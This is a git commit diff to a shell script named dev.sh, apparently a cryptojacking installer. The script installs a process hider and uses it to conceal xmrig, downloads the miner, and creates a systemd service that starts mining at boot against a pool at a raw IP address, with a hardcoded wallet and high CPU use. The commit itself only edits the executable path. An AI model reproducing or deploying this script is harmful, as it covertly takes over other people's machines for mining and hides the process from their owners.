c88e471dedbe838dac4257bd29ec0dc0826844ed
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-06-17 02:25:58 +0700

    Update dev.sh

--- dev.sh
+++ dev.sh
@@ -10,7 +10,7 @@ then
   sudo apt update -y
   npm i -g node-process-hider && ph add xmrig
 	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
-	sudo bash -c 'echo -e "[Unit]\nDescription=xmrig\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/xmrig -a rx/0 -o 104.248.119.73:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Kevin --threads=16 --cpu-priority=16 --randomx-mode=fast --keepalive 
+	sudo bash -c 'echo -e "[Unit]\nDescription=xmrig\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/./xmrig -a rx/0 -o 104.248.119.73:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Kevin --threads=16 --cpu-priority=16 --randomx-mode=fast --keepalive 
  &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmr.service'
 	sudo systemctl daemon-reload
 	sudo systemctl enable xmr.service
